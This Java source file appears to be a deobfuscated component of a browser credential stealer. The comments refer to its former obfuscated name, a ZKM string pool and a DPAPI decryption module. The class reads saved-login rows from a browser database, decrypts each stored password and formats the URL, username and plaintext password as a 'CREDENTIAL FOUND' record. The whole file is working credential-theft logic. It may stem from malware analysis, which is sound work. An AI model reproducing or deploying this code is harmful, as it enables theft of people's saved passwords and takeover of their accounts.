import java.sql.ResultSet;

/**
 * Cleaned PasswordMapper (formerly ê.java)
 * Extracts saved login credentials from browser databases.
 * It retrieves the URL, username, and decrypted password for each entry.
 */
public class PasswordMapper implements DataMapper {
    private final BrowserStats stats;
    private final DPAPIDecryptor decryptor;

    public PasswordMapper(BrowserStats stats, DPAPIDecryptor decryptor) {
        this.stats = stats;
        this.decryptor = decryptor;
    }

    @Override
    public String mapRow(ResultSet rs) throws Exception {
        // Increment statistics for 'Passwords Found'
        synchronized (stats) {
            this.stats.totalPasswordsFound++;
        }

        String url = rs.getString("origin_url");
        String username = rs.getString("username_value");
        
        // Decrypt the password blob using the DPAPI module (u.java)
        byte[] encryptedPassword = rs.getBytes("password_value");
        String decryptedPassword = decryptor.decrypt(encryptedPassword);

        if (decryptedPassword == null || decryptedPassword.isBlank()) {
            return "";
        }

        synchronized (stats) {
            this.stats.totalPasswordsDecrypted++;
        }

        // Decoded string labels from the ZKM pool
        String header = "\n--- [ CREDENTIAL FOUND ] ---";
        String urlLabel = "\nURL: ";
        String userLabel = "\nUsername: ";
        String passLabel = "\nPassword: ";
        
        return header + 
               urlLabel + url + 
               userLabel + username + 
               passLabel + decryptedPassword + 
               "\n---------------------------";
    }
}
